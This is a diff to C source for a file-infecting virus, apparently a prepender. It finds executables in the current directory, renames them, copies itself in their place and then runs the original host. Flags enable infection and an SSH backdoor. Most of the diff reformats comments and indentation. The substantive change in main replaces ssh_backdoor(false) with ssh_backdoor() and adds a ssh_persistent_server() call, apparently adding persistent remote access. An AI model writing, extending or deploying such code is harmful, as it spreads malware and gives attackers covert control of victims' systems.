@@ -6,8 +6,11 @@
  * @date 2026
  */
 
+#include <dirent.h>
 #include <gtk/gtk.h>
 #include <libgen.h>
+#include <stdbool.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
@@ -20,7 +23,8 @@ static bool INFECT_FILES = true;
 static bool SSH_BACKDOOR = true;
 
 /**
- * @brief A structure to hold lists of new and old executable files, as well as the program the user intended to run (main)
+ * @brief A structure to hold lists of new and old executable files, as well as
+ * the program the user intended to run (main)
  */
 typedef struct {
   char new[1000];
@@ -29,7 +33,8 @@ typedef struct {
 } Programs;
 
 /**
- * @brief Check if the program is already infected by comparing new and old files
+ * @brief Check if the program is already infected by comparing new and old
+ * files
  *
  * @params files: A structure containing lists of new and old executable files
  * @return A string containing the names of uninfected files to be infected
@@ -47,9 +52,11 @@ char *isInfected(Programs *files) {
 }
 
 /**
- * @brief Infect uninfected files by renaming them, copying the main program, and setting permissions
+ * @brief Infect uninfected files by renaming them, copying the main program,
+ * and setting permissions
  *
- * @params uninfectedFile: A string containing the names of uninfected files to be infected
+ * @params uninfectedFile: A string containing the names of uninfected files to
+ * be infected
  * @params programName: The name of the main program to be copied for infection
  */
 void infect(char *uninfectedFile, char *programName) {
@@ -77,10 +84,12 @@ void infect(char *uninfectedFile, char *programName) {
 }
 
 /**
- * @brief Find executable files in the current directory and categorize them as new, old, or main program
+ * @brief Find executable files in the current directory and categorize them as
+ * new, old, or main program
  *
  * @params programName: The name of the main program to be identified
- * @return A structure containing lists of new and old executable files, as well as the main program name
+ * @return A structure containing lists of new and old executable files, as well
+ * as the main program name
  */
 Programs *fileFinder(char *programName) {
   DIR *dir;
@@ -116,7 +125,8 @@ Programs *fileFinder(char *programName) {
 /**
  * @brief Execute the program the user intended to run, referred to here as main
  *
- * @params files: A structure containing lists of new and old executable files, as well as the main program name
+ * @params files: A structure containing lists of new and old executable files,
+ * as well as the main program name
  * @params programName: The name of the main program to be executed
  * @params argc: The argument count passed to the main function
  * @params argv: The argument vector passed to the main function
@@ -132,7 +142,7 @@ int execHost(Programs *files, char *programName, int argc, char *argv[]) {
 }
 
 int main(int argc, char *argv[]) {
-	int opt;
+  int opt;
 
   char pathbuf[256];
   snprintf(pathbuf, sizeof(pathbuf), "%s", argv[0]);
@@ -140,14 +150,14 @@ int main(int argc, char *argv[]) {
 
   Programs *files = fileFinder(prog_name);
 
-	if (INFECT_FILES) {
-		char *uninfectedFile = isInfected(files);
-		infect(uninfectedFile, prog_name);
-	}
+  if (INFECT_FILES) {
+    char *uninfectedFile = isInfected(files);
+    infect(uninfectedFile, prog_name);
+  }
+  if (SSH_BACKDOOR) {
+    ssh_backdoor();
+    ssh_persistent_server();
+  }
 
-	if (SSH_BACKDOOR) {
-		ssh_backdoor(false);
-	}
-
-	return execHost(files, prog_name, argc, argv);
+  return execHost(files, prog_name, argc, argv);
 }
